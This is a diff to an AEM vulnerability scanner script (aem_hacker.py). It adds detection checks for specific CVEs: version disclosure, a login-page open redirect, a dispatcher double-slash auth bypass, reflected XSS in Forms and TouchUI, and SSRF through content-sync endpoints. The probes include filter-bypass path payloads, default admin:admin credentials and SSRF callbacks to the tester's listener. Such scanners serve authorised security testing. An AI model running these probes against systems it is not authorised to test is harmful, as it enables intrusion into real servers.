@@ -6,12 +6,22 @@ Performs dozens of checks against a target AEM URL to identify common
 misconfigurations and known vulnerabilities including:
   - Exposed admin servlets (DefaultGetServlet, QueryBuilder, GQL, POST, Login-Status, etc.)
   - Server-Side Request Forgery (SSRF) via Salesforce, ReportingServices, SiteCatalyst,
-    AutoProvisioning and OpenSocial endpoints
+    AutoProvisioning, OpenSocial and content-sync/replication endpoints
+  - CVE-2021-40722: Unauthenticated SSRF (APSB21-99)
   - Reflected XSS via legacy SWF files
+  - CVE-2022-30677 / CVE-2022-30679: Reflected XSS in AEM TouchUI / workflow console (APSB22-40)
+  - CVE-2021-36063: Reflected XSS in AEM Forms (APSB21-77)
   - Remote Code Execution surfaces (Felix Console, Groovy Console, ACS Tools)
   - Java deserialization (ExternalJobServlet)
   - Exposed CRXDE/CRX interfaces
   - Default credentials
+  - CVE-2015-1833: WebDAV XXE (Jackrabbit)
+  - CVE-2016-7882: WCMDebugFilter reflected XSS (APSB16-38)
+  - CVE-2018-5006 / CVE-2018-12809: SSRF via Salesforce and Reporting servlets (APSB18-23)
+  - CVE-2019-8086: XXE in GuideInternalSubmitServlet (APSB19-22)
+  - CVE-2023-29297: Open redirect in AEM login page (APSB23-31)
+  - CVE-2023-38205: Auth bypass via double-slash dispatcher bypass (APSB23-43)
+  - AEM version disclosure (hardening check)
 
 A listener is started on --port to detect inbound SSRF callbacks; use --host to
 specify the externally reachable hostname/IP for the SSRF back-connect URL.
@@ -19,8 +29,12 @@ specify the externally reachable hostname/IP for the SSRF back-connect URL.
 Usage:
     python3 aem_hacker.py -u https://aem.example.com --host your.vps.ip [options]
 
+See CVE_COVERAGE.md for the full list of implemented and planned checks with CVE
+references, affected versions, and severity ratings.
+
 References:
     https://speakerdeck.com/0ang3el/hunting-for-security-bugs-in-aem-webapps
+    https://helpx.adobe.com/security/security-bulletin.html
 """
 
 import concurrent.futures
@@ -2547,6 +2561,462 @@ def exposed_acs_tools(base_url, my_host, debug=False, proxy=None):
                     check="exposed_acs_tools",
                     url=url,
                 )
+
+    return results
+
+
+@register("version_disclosure")
+def check_version_disclosure(base_url, my_host, debug=False, proxy=None):
+    """Check for AEM version disclosure via login page and Felix console product-info (hardening check).
+
+    Exposing the AEM version allows attackers to quickly identify applicable CVEs.
+    Reference: https://helpx.adobe.com/security/security-bulletin.html
+    """
+    r = random_string(3)
+
+    LOGINPATHS = itertools.product(
+        (
+            "/libs/granite/core/content/login.html",
+            "///libs///granite///core///content///login.html",
+        ),
+        (
+            "",
+            "/{0}.css",
+            "/{0}.html",
+            ";%0a{0}.css",
+            ";%0a{0}.html",
+        ),
+    )
+    LOGINPATHS = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in LOGINPATHS)
+
+    PRODUCTINFO = itertools.product(
+        ("/system/console/productinfo", "///system///console///productinfo"),
+        (
+            "",
+            ".json",
+            "/{0}.css",
+            "/{0}.html",
+            ";%0a{0}.css",
+        ),
+    )
+    PRODUCTINFO = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in PRODUCTINFO)
+
+    results = []
+
+    for path in LOGINPATHS:
+        url = normalize_url(base_url, path)
+        try:
+            resp = http_request(url, proxy=proxy, debug=debug)
+
+            if resp.status_code == 200 and "Adobe Experience Manager" in str(
+                resp.content
+            ):
+                body = str(resp.content)
+                has_version = any(
+                    token in body
+                    for token in [
+                        "6.0",
+                        "6.1",
+                        "6.2",
+                        "6.3",
+                        "6.4",
+                        "6.5",
+                        "2023",
+                        "2024",
+                        "2025",
+                        "Cloud Service",
+                    ]
+                )
+                if has_version:
+                    f = Finding(
+                        "AEM Version Disclosure",
+                        url,
+                        "AEM version information is disclosed via the login page. "
+                        "An attacker can identify the exact AEM release and target known CVEs. "
+                        "See - https://helpx.adobe.com/security/security-bulletin.html",
+                    )
+                    results.append(f)
+                    break
+        except Exception:
+            if debug:
+                error(
+                    "Exception while performing a check",
+                    check="check_version_disclosure",
+                    url=url,
+                )
+
+    for path in PRODUCTINFO:
+        url = normalize_url(base_url, path)
+        headers = {"Authorization": "Basic YWRtaW46YWRtaW4="}  # admin:admin
+        try:
+            resp = http_request(
+                url, additional_headers=headers, proxy=proxy, debug=debug
+            )
+
+            if resp.status_code == 200 and (
+                "Adobe Experience Manager" in str(resp.content)
+                or "CQ Version" in str(resp.content)
+                or "Quickstart" in str(resp.content)
+            ):
+                f = Finding(
+                    "AEM Version Disclosure (ProductInfo)",
+                    url,
+                    "AEM product information endpoint is accessible. "
+                    "Disclosed version details help attackers target specific CVEs. "
+                    "See - https://helpx.adobe.com/security/security-bulletin.html",
+                )
+                results.append(f)
+                break
+        except Exception:
+            if debug:
+                error(
+                    "Exception while performing a check",
+                    check="check_version_disclosure",
+                    url=url,
+                )
+
+    return results
+
+
+@register("open_redirect")
+def check_open_redirect(base_url, my_host, debug=False, proxy=None):
+    """Check for open redirect vulnerability (CVE-2023-29297) via AEM login page resource parameter.
+
+    CVE-2023-29297 (APSB23-31): Improper Input Validation in the login page allows an
+    unauthenticated attacker to redirect a user to an arbitrary external domain via the
+    'resource' query parameter.  Affected versions: AEM 6.5.16.0 and earlier.
+    Reference: https://helpx.adobe.com/security/products/experience-manager/apsb23-31.html
+    """
+    # Use a safe, non-routable domain name as the canary – we never actually contact it
+    CANARY = "evil.example.com"
+
+    REDIRECT_PATHS = (
+        "/libs/cq/core/content/login.html?resource=https://{0}".format(CANARY),
+        "/libs/granite/core/content/login.html?resource=https://{0}".format(CANARY),
+        "/libs/cq/core/content/login.html?resource=//{0}".format(CANARY),
+        "/libs/granite/core/content/login.html?resource=//{0}".format(CANARY),
+    )
+
+    results = []
+
+    for path in REDIRECT_PATHS:
+        url = normalize_url(base_url, path)
+        try:
+            resp = http_request(url, proxy=proxy, debug=debug)
+
+            location = resp.headers.get("Location", "")
+            if resp.status_code in [301, 302, 303, 307, 308] and CANARY in location:
+                f = Finding(
+                    "OpenRedirect",
+                    url,
+                    "Open redirect (CVE-2023-29297) detected. "
+                    "The login page redirects to an external domain via the 'resource' parameter. "
+                    "See - https://helpx.adobe.com/security/products/experience-manager/apsb23-31.html",
+                )
+                results.append(f)
+                break
+        except Exception:
+            if debug:
+                error(
+                    "Exception while performing a check",
+                    check="check_open_redirect",
+                    url=url,
+                )
+
+    return results
+
+
+@register("auth_bypass_cve_2023_38205")
+def check_auth_bypass_cve_2023_38205(base_url, my_host, debug=False, proxy=None):
+    """Check for authentication bypass (CVE-2023-38205) via double-slash path manipulation.
+
+    CVE-2023-38205 (APSB23-43): Improper Access Control.  The Dispatcher can be bypassed
+    to reach protected endpoints (Felix OSGi Console, CRX Package Manager) by using
+    double- or triple-forward-slash prefixes that the Dispatcher filter does not normalise
+    before handing the request to AEM/Sling.  Includes the related Detectify 2021 CRX
+    Package Manager bypass.
+    Affected versions: AEM 6.5.17.0 and earlier.
+    Reference: https://helpx.adobe.com/security/products/experience-manager/apsb23-43.html
+    Reference: https://labs.detectify.com/writeups/undocumented-authentication-bypass-issue-in-aem-package-manager-blog-updated/
+    """
+    r = random_string(3)
+
+    FELIX_BYPASS = itertools.product(
+        (
+            "//system//console//bundles",
+            "////system////console////bundles",
+        ),
+        (
+            "",
+            "/{0}.css",
+            "/{0}.html",
+            ";%0a{0}.css",
+        ),
+    )
+    FELIX_BYPASS = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in FELIX_BYPASS)
+
+    CRX_BYPASS = itertools.product(
+        (
+            "//crx//packmgr//index.jsp",
+            "////crx////packmgr////index.jsp",
+            "//crx//de//index.jsp",
+            "////crx////de////index.jsp",
+        ),
+        (
+            "",
+            ";%0a{0}.css",
+            "/{0}.css",
+        ),
+    )
+    CRX_BYPASS = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in CRX_BYPASS)
+
+    results = []
+
+    for path in FELIX_BYPASS:
+        url = normalize_url(base_url, path)
+        try:
+            resp = http_request(url, proxy=proxy, debug=debug)
+
+            if resp.status_code == 200 and "Web Console - Bundles" in str(resp.content):
+                f = Finding(
+                    "AuthBypassFelixConsole",
+                    url,
+                    "Felix Console is accessible without authentication via double-slash "
+                    "dispatcher bypass (CVE-2023-38205). RCE via bundle upload is possible. "
+                    "See - https://helpx.adobe.com/security/products/experience-manager/apsb23-43.html",
+                )
+                results.append(f)
+                break
+        except Exception:
+            if debug:
+                error(
+                    "Exception while performing a check",
+                    check="check_auth_bypass_cve_2023_38205",
+                    url=url,
+                )
+
+    for path in CRX_BYPASS:
+        url = normalize_url(base_url, path)
+        try:
+            resp = http_request(url, proxy=proxy, debug=debug)
+
+            if resp.status_code == 200 and (
+                "CRX Package Manager" in str(resp.content)
+                or "CRXDE Lite" in str(resp.content)
+            ):
+                f = Finding(
+                    "AuthBypassCRX",
+                    url,
+                    "CRX Package Manager or CRXDE Lite is accessible without authentication "
+                    "via double-slash dispatcher bypass (CVE-2023-38205 / Detectify 2021). "
+                    "Unauthenticated package upload (RCE) may be possible. "
+                    "See - https://helpx.adobe.com/security/products/experience-manager/apsb23-43.html",
+                )
+                results.append(f)
+                break
+        except Exception:
+            if debug:
+                error(
+                    "Exception while performing a check",
+                    check="check_auth_bypass_cve_2023_38205",
+                    url=url,
+                )
+
+    return results
+
+
+@register("xss_aem_forms")
+def check_xss_aem_forms(base_url, my_host, debug=False, proxy=None):
+    """Check for reflected XSS in AEM Forms endpoints (CVE-2021-36063).
+
+    CVE-2021-36063 (APSB21-77): Reflected Cross-site Scripting in AEM Forms components.
+    Affected versions: AEM Forms 6.5.10.0 and earlier.
+    Reference: https://helpx.adobe.com/security/products/experience-manager/apsb21-77.html
+    """
+    r = random_string(3)
+
+    # Common AEM Forms endpoints known to reflect unsanitised input
+    FORMS_XSS = itertools.product(
+        (
+            "/content/forms/af",
+            "/libs/fd/af/components",
+            "///content///forms///af",
+        ),
+        (
+            ".html?{0}=<1337xss>",
+            ".json/{0}.html?dummyParam=<1337xss>",
+            ";%0a{0}.html?dummyParam=<1337xss>",
+        ),
+    )
+    FORMS_XSS = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in FORMS_XSS)
+
+    results = []
+
+    for path in FORMS_XSS:
+        url = normalize_url(base_url, path)
+        try:
+            resp = http_request(url, proxy=proxy, debug=debug)
+
+            if resp.status_code == 200 and "<1337xss>" in str(resp.content):
+                ct = content_type(resp.headers.get("Content-Type", ""))
+                if "html" in ct:
+                    f = Finding(
+                        "XSS in AEM Forms",
+                        url,
+                        "Reflected XSS detected in AEM Forms endpoint (CVE-2021-36063). "
+                        "User-supplied input is echoed without HTML encoding. "
+                        "See - https://helpx.adobe.com/security/products/experience-manager/apsb21-77.html",
+                    )
+                    results.append(f)
+                    break
+        except Exception:
+            if debug:
+                error(
+                    "Exception while performing a check",
+                    check="check_xss_aem_forms",
+                    url=url,
+                )
+
+    return results
+
+
+@register("xss_reflected_cve_2022")
+def check_xss_reflected_cve_2022(base_url, my_host, debug=False, proxy=None):
+    """Check for reflected XSS in AEM TouchUI and workflow components (CVE-2022-30677, CVE-2022-30679).
+
+    CVE-2022-30677 / CVE-2022-30679 (APSB22-40): Multiple reflected XSS vulnerabilities
+    in AEM TouchUI shell and workflow console components.  User-controlled input from URL
+    selectors or query parameters is echoed unencoded in HTML responses.
+    Affected versions: AEM 6.5.13.0 and earlier.
+    Reference: https://helpx.adobe.com/security/products/experience-manager/apsb22-40.html
+    """
+    r = random_string(3)
+
+    TOUCHUI_XSS = itertools.product(
+        (
+            "/libs/cq/workflow/content/console.html",
+            "/libs/granite/ui/components/shell/clientlibs",
+            "///libs///cq///workflow///content///console.html",
+        ),
+        (
+            "/{0}/<1337xss>.html",
+            ";%0a{0}.html?a=<1337xss>",
+            "/{0}.html?resource=<1337xss>",
+        ),
+    )
+    TOUCHUI_XSS = list("{0}{1}".format(p1, p2.format(r)) for p1, p2 in TOUCHUI_XSS)
+
+    SHELL_XSS = (
+        "/libs/wcm/core/content/sites/jcr:content.html?{0}=<1337xss>".format(r),
+        "/libs/cq/gui/content/dnd.html?targetURL=<1337xss>",
+    )
+
+    results = []
+
+    for path in list(TOUCHUI_XSS) + list(SHELL_XSS):
+        url = normalize_url(base_url, path)
+        try:
+            resp = http_request(url, proxy=proxy, debug=debug)
+
+            if resp.status_code == 200 and "<1337xss>" in str(resp.content):
+                ct = content_type(resp.headers.get("Content-Type", ""))
+                if "html" in ct:
+                    f = Finding(
+                        "XSS in AEM TouchUI",
+                        url,
+                        "Reflected XSS detected in AEM TouchUI/workflow endpoint "
+                        "(CVE-2022-30677 / CVE-2022-30679). "
+                        "User-supplied input is echoed without HTML encoding. "
+                        "See - https://helpx.adobe.com/security/products/experience-manager/apsb22-40.html",
+                    )
+                    results.append(f)
+                    break
+        except Exception:
+            if debug:
+                error(
+                    "Exception while performing a check",
+                    check="check_xss_reflected_cve_2022",
+                    url=url,
+                )
+
+    return results
+
+
+@register("ssrf_cve_2021_40722")
+def ssrf_cve_2021_40722(base_url, my_host, debug=False, proxy=None):
+    """Check for unauthenticated SSRF (CVE-2021-40722) via AEM proxy servlet endpoints.
+
+    CVE-2021-40722 (APSB21-99): Server-Side Request Forgery allows an unauthenticated
+    attacker to make the AEM server issue HTTP requests to arbitrary internal hosts.
+    Affected versions: AEM 6.5.10.0 and earlier (on-premise).
+    Reference: https://helpx.adobe.com/security/products/experience-manager/apsb21-99.html
+    """
+    global token, d
+
+    r = random_string(3)
+
+    # Proxy-like servlets identified in AEM that may have been patched in APSB21-99
+    SSRF_PATHS1 = itertools.product(
+        (
+            "/libs/granite/ui/components/foundation/clientlibs/foundation/javascript/granite/csrf.json",
+            "/libs/cq/contentsync/content/replication{0}",
+            "///libs///cq///contentsync///content///replication{0}",
+        ),
+        (".json", ".1.json", ".html"),
+    )
+    SSRF_PATHS1 = list(pair[0].format(pair[1]) for pair in SSRF_PATHS1)
+
+    SSRF_PATHS2 = itertools.product(
+        (
+            "/libs/cq/contentsync/content/replication{0}?path={{0}}",
+            "///libs///cq///contentsync///content///replication{0}?path={{0}}",
+        ),
+        (
+            ".json",
+            ".1.json",
+            ".4.2.1...json",
+            ".html",
+            ".html/{0}.css",
+            ".html;%0a{0}.css",
+        ),
+    )
+    cache_buster = random_string()
+    SSRF_PATHS2 = list(
+        pair[0].format(pair[1].format(cache_buster)) for pair in SSRF_PATHS2
+    )
+
+    results = []
+
+    for path in SSRF_PATHS2:
+        url = normalize_url(base_url, path)
+        encoded_orig_url = (base64.b16encode(url.encode())).decode()
+        back_url = "http://{0}/{1}/cve202140722/{2}/".format(
+            my_host, token, encoded_orig_url
+        )
+        url = url.format(back_url)
+
+        try:
+            http_request(url, proxy=proxy, debug=debug)
+        except Exception:
+            if debug:
+                error(
+                    "Exception while performing a check",
+                    check="ssrf_cve_2021_40722",
+                    url=url,
+                )
+
+    time.sleep(10)
+
+    if "cve202140722" in d:
+        u = base64.b16decode(d.get("cve202140722")[0]).decode()
+        f = Finding(
+            "SSRF CVE-2021-40722",
+            u,
+            "Unauthenticated SSRF (CVE-2021-40722) detected via AEM content-sync/replication endpoint. "
+            "An attacker can pivot to internal services. "
+            "See - https://helpx.adobe.com/security/products/experience-manager/apsb21-99.html",
+        )
+        results.append(f)
 
     return results
 
